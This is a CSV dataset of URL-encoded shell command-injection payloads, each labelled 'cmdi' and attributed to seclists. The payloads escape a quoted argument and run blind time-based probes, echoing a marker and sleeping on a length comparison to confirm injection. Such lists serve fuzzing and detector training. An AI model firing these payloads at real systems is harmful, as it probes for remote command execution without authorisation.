payload,label,source
%27%3B%20str%3D%24%28echo%20ASBPAS%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%7C,cmdi,seclists
%27%3B%20str%3D%24%28echo%20ASBPAS%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%7C,cmdi,seclists
%27%3B%20str%3D%24%28echo%20ASBPAS%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%7C,cmdi,seclists
%27%3B%20str%3D%24%28echo%20ASBPAS%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%7C,cmdi,seclists
%27%3B%20str%3D%24%28echo%20ASBPAS%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%7C,cmdi,seclists
%27%3B%20str%3D%24%28echo%20ASBPAS%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%7C,cmdi,seclists
%27%7C%20%5B%201%20-ne%20%24%28echo%20FNEGWH%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%7C,cmdi,seclists
%27%7C%20%5B%202%20-ne%20%24%28echo%20FNEGWH%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%7C,cmdi,seclists
%27%7C%20%5B%203%20-ne%20%24%28echo%20FNEGWH%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%7C,cmdi,seclists
%27%7C%20%5B%204%20-ne%20%24%28echo%20FNEGWH%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%7C,cmdi,seclists
%27%7C%20%5B%205%20-ne%20%24%28echo%20FNEGWH%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%7C,cmdi,seclists
%27%7C%20%5B%206%20-ne%20%24%28echo%20FNEGWH%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%7C,cmdi,seclists
%27%7C%20%5B%207%20-ne%20%24%28echo%20FNEGWH%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%7C,cmdi,seclists
%27%7C%20%5B%208%20-ne%20%24%28echo%20FNEGWH%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%7C,cmdi,seclists
%27%7C%20%5B%209%20-ne%20%24%28echo%20FNEGWH%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%7C,cmdi,seclists
%27%26%20sleep%200%20%26%26%20str%3D%24%28echo%20WSMVBW%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%201%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%7C,cmdi,seclists
%27%26%20sleep%200%20%26%26%20str%3D%24%28echo%20WSMVBW%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%202%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%7C,cmdi,seclists
%27%26%20sleep%200%20%26%26%20str%3D%24%28echo%20WSMVBW%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%203%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%7C,cmdi,seclists
%27%26%20sleep%200%20%26%26%20str%3D%24%28echo%20WSMVBW%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%204%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%7C,cmdi,seclists
%27%26%20sleep%200%20%26%26%20str%3D%24%28echo%20WSMVBW%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%205%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%7C,cmdi,seclists
%27%26%20sleep%200%20%26%26%20str%3D%24%28echo%20WSMVBW%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%206%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%7C,cmdi,seclists
%27%26%20sleep%200%20%26%26%20str%3D%24%28echo%20WSMVBW%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%207%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%7C,cmdi,seclists
%27%26%20sleep%200%20%26%26%20str%3D%24%28echo%20WSMVBW%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%208%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%7C,cmdi,seclists
%27%26%20sleep%200%20%26%26%20str%3D%24%28echo%20WSMVBW%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%209%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%7C,cmdi,seclists
%27%0A%20str%3D%24%28echo%20TNNFNL%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%7C,cmdi,seclists
%27%0A%20str%3D%24%28echo%20TNNFNL%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%202%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%7C,cmdi,seclists
%27%0A%20str%3D%24%28echo%20TNNFNL%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%203%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%7C,cmdi,seclists
%27%0A%20str%3D%24%28echo%20TNNFNL%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%7C,cmdi,seclists
%27%0A%20str%3D%24%28echo%20TNNFNL%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%7C,cmdi,seclists
%27%0A%20str%3D%24%28echo%20TNNFNL%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%7C,cmdi,seclists
%27%0A%20str%3D%24%28echo%20TNNFNL%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%7C,cmdi,seclists
%27%0A%20str%3D%24%28echo%20TNNFNL%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%7C,cmdi,seclists
%27%0A%20str%3D%24%28echo%20TNNFNL%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%7C,cmdi,seclists
%27%3B%20str%3D%24%28echo%20WSGIYR%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2527,cmdi,seclists
%27%3B%20str%3D%24%28echo%20WSGIYR%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%202%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2527,cmdi,seclists
%27%3B%20str%3D%24%28echo%20WSGIYR%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%203%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2527,cmdi,seclists
%27%3B%20str%3D%24%28echo%20WSGIYR%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2527,cmdi,seclists
%27%3B%20str%3D%24%28echo%20WSGIYR%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2527,cmdi,seclists
%27%3B%20str%3D%24%28echo%20WSGIYR%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2527,cmdi,seclists
%27%3B%20str%3D%24%28echo%20WSGIYR%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2527,cmdi,seclists
%27%3B%20str%3D%24%28echo%20WSGIYR%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2527,cmdi,seclists
%27%3B%20str%3D%24%28echo%20WSGIYR%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2527,cmdi,seclists
%27%7C%20%5B%201%20-ne%20%24%28echo%20QPTCDE%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2527,cmdi,seclists
%27%7C%20%5B%202%20-ne%20%24%28echo%20QPTCDE%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2527,cmdi,seclists
%27%7C%20%5B%203%20-ne%20%24%28echo%20QPTCDE%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2527,cmdi,seclists
%27%7C%20%5B%204%20-ne%20%24%28echo%20QPTCDE%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2527,cmdi,seclists
%27%7C%20%5B%205%20-ne%20%24%28echo%20QPTCDE%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2527,cmdi,seclists
%27%7C%20%5B%206%20-ne%20%24%28echo%20QPTCDE%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2527,cmdi,seclists
%27%7C%20%5B%207%20-ne%20%24%28echo%20QPTCDE%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2527,cmdi,seclists
%27%7C%20%5B%208%20-ne%20%24%28echo%20QPTCDE%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2527,cmdi,seclists
%27%7C%20%5B%209%20-ne%20%24%28echo%20QPTCDE%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2527,cmdi,seclists
%27%26%20sleep%200%20%26%26%20str%3D%24%28echo%20UXESAW%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%201%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2527,cmdi,seclists
%27%26%20sleep%200%20%26%26%20str%3D%24%28echo%20UXESAW%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%202%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2527,cmdi,seclists
%27%26%20sleep%200%20%26%26%20str%3D%24%28echo%20UXESAW%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%203%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2527,cmdi,seclists
%27%26%20sleep%200%20%26%26%20str%3D%24%28echo%20UXESAW%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%204%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2527,cmdi,seclists
%27%26%20sleep%200%20%26%26%20str%3D%24%28echo%20UXESAW%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%205%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2527,cmdi,seclists
%27%26%20sleep%200%20%26%26%20str%3D%24%28echo%20UXESAW%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%206%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2527,cmdi,seclists
%27%26%20sleep%200%20%26%26%20str%3D%24%28echo%20UXESAW%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%207%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2527,cmdi,seclists
%27%26%20sleep%200%20%26%26%20str%3D%24%28echo%20UXESAW%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%208%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2527,cmdi,seclists
%27%26%20sleep%200%20%26%26%20str%3D%24%28echo%20UXESAW%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%209%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2527,cmdi,seclists
%27%0A%20str%3D%24%28echo%20PAACLD%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2527,cmdi,seclists
%27%0A%20str%3D%24%28echo%20PAACLD%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%202%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2527,cmdi,seclists
%27%0A%20str%3D%24%28echo%20PAACLD%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%203%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2527,cmdi,seclists
%27%0A%20str%3D%24%28echo%20PAACLD%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2527,cmdi,seclists
%27%0A%20str%3D%24%28echo%20PAACLD%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2527,cmdi,seclists
%27%0A%20str%3D%24%28echo%20PAACLD%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2527,cmdi,seclists
%27%0A%20str%3D%24%28echo%20PAACLD%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2527,cmdi,seclists
%27%0A%20str%3D%24%28echo%20PAACLD%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2527,cmdi,seclists
%27%0A%20str%3D%24%28echo%20PAACLD%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2527,cmdi,seclists
%27%3B%20str%3D%24%28echo%20FBVDTE%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2522,cmdi,seclists
%27%3B%20str%3D%24%28echo%20FBVDTE%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%202%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2522,cmdi,seclists
%27%3B%20str%3D%24%28echo%20FBVDTE%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%203%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2522,cmdi,seclists
%27%3B%20str%3D%24%28echo%20FBVDTE%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2522,cmdi,seclists
%27%3B%20str%3D%24%28echo%20FBVDTE%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2522,cmdi,seclists
%27%3B%20str%3D%24%28echo%20FBVDTE%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2522,cmdi,seclists
%27%3B%20str%3D%24%28echo%20FBVDTE%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2522,cmdi,seclists
%27%3B%20str%3D%24%28echo%20FBVDTE%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2522,cmdi,seclists
%27%3B%20str%3D%24%28echo%20FBVDTE%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2522,cmdi,seclists
%27%7C%20%5B%201%20-ne%20%24%28echo%20ZATMDT%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2522,cmdi,seclists
%27%7C%20%5B%202%20-ne%20%24%28echo%20ZATMDT%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2522,cmdi,seclists
%27%7C%20%5B%203%20-ne%20%24%28echo%20ZATMDT%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2522,cmdi,seclists
%27%7C%20%5B%204%20-ne%20%24%28echo%20ZATMDT%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2522,cmdi,seclists
%27%7C%20%5B%205%20-ne%20%24%28echo%20ZATMDT%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2522,cmdi,seclists
%27%7C%20%5B%206%20-ne%20%24%28echo%20ZATMDT%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2522,cmdi,seclists
%27%7C%20%5B%207%20-ne%20%24%28echo%20ZATMDT%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2522,cmdi,seclists
%27%7C%20%5B%208%20-ne%20%24%28echo%20ZATMDT%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2522,cmdi,seclists
%27%7C%20%5B%209%20-ne%20%24%28echo%20ZATMDT%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2522,cmdi,seclists
%27%26%20sleep%200%20%26%26%20str%3D%24%28echo%20ERQGRV%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%201%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2522,cmdi,seclists
%27%26%20sleep%200%20%26%26%20str%3D%24%28echo%20ERQGRV%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%202%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2522,cmdi,seclists
%27%26%20sleep%200%20%26%26%20str%3D%24%28echo%20ERQGRV%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%203%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2522,cmdi,seclists
%27%26%20sleep%200%20%26%26%20str%3D%24%28echo%20ERQGRV%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%204%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2522,cmdi,seclists
%27%26%20sleep%200%20%26%26%20str%3D%24%28echo%20ERQGRV%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%205%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2522,cmdi,seclists
%27%26%20sleep%200%20%26%26%20str%3D%24%28echo%20ERQGRV%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%206%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2522,cmdi,seclists
%27%26%20sleep%200%20%26%26%20str%3D%24%28echo%20ERQGRV%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%207%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2522,cmdi,seclists
%27%26%20sleep%200%20%26%26%20str%3D%24%28echo%20ERQGRV%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%208%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2522,cmdi,seclists
%27%26%20sleep%200%20%26%26%20str%3D%24%28echo%20ERQGRV%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%209%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2522,cmdi,seclists
%27%0A%20str%3D%24%28echo%20WYYYZM%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2522,cmdi,seclists
%27%0A%20str%3D%24%28echo%20WYYYZM%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%202%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2522,cmdi,seclists
%27%0A%20str%3D%24%28echo%20WYYYZM%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%203%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2522,cmdi,seclists
%27%0A%20str%3D%24%28echo%20WYYYZM%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2522,cmdi,seclists
%27%0A%20str%3D%24%28echo%20WYYYZM%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2522,cmdi,seclists
%27%0A%20str%3D%24%28echo%20WYYYZM%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2522,cmdi,seclists
%27%0A%20str%3D%24%28echo%20WYYYZM%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2522,cmdi,seclists
%27%0A%20str%3D%24%28echo%20WYYYZM%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2522,cmdi,seclists
%27%0A%20str%3D%24%28echo%20WYYYZM%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2522,cmdi,seclists
%27%3B%20str%3D%24%28echo%20QZBRFT%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%255C%255C,cmdi,seclists
%27%3B%20str%3D%24%28echo%20QZBRFT%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%202%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%255C%255C,cmdi,seclists
%27%3B%20str%3D%24%28echo%20QZBRFT%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%203%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%255C%255C,cmdi,seclists
%27%3B%20str%3D%24%28echo%20QZBRFT%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%255C%255C,cmdi,seclists
%27%3B%20str%3D%24%28echo%20QZBRFT%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%255C%255C,cmdi,seclists
%27%3B%20str%3D%24%28echo%20QZBRFT%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%255C%255C,cmdi,seclists
